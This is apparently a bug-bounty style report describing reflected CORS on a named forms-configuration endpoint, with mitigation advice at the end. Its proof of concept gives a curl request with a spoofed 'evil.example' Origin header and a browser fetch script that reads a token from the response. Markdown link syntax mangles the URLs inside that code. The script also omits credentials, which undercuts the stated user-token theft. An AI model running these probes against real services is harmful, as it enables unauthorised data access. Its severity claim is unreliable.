# Vulnerability Report: Reflected CORS and Information Disclosure

## Summary
A **Cross-Origin Resource Sharing (CORS) with reflection** vulnerability was discovered on the endpoint `https://forms.hscollectedforms.net/collected-forms/v1/config/json?portalId=5562482&utk=`. This flaw allows an attacker, through a controlled webpage, to obtain a user's sensitive information (a token). The server incorrectly reflects the `Origin` header, enabling an external site to read the JSON response.

## Technical Details
The server does not validate the `Origin` header against a whitelist of allowed domains. Instead, it simply mirrors the `Origin` value from the incoming request into the `Access-Control-Allow-Origin` response header. This, combined with the response containing a `token` field, allows an attacker to bypass the Same-Origin Policy and read the data.

### Impact
This vulnerability can be exploited by an attacker to exfiltrate a user's token, which could potentially be used to access resources or perform actions on their behalf on related services.

## Proof of Concept (PoC)
1. **Verify header reflection:**
   Use `curl` to send a request with a malicious `Origin` header:
   ```bash
   curl -is -H "Origin: [https://evil.example](https://evil.example)" \
   [https://forms.hscollectedforms.net/collected-forms/v1/config/json?portalId=5562482&utk=](https://forms.hscollectedforms.net/collected-forms/v1/config/json?portalId=5562482&utk=)
Expected Result: The server's response will include the header Access-Control-Allow-Origin: https://evil.example.

Demonstrate reading from an external site:
Create an HTML file, for example, poc.html, and open it in a web browser. The script will use fetch to make the request and display the response in the console.

HTML

<script>
fetch('[https://forms.hscollectedforms.net/collected-forms/v1/config/json?portalId=5562482&utk=](https://forms.hscollectedforms.net/collected-forms/v1/config/json?portalId=5562482&utk=)', {
    method: 'GET',
    credentials: 'omit' // Credentials are not required for this attack
})
.then(r => r.text())
.then(t => console.log('Response body:', t))
.catch(e => console.error('Error:', e));
</script>
Expected Result: The browser's console will display the JSON response body, including the token, which demonstrates the information leak.


Mitigation Recommendations
It is recommended that the server validate the Origin header against a whitelist of allowed domains before reflecting it in Access-Control-Allow-Origin. If no domains are allowed, consider omitting the Access-Control-Allow-Origin header from the responses.


   
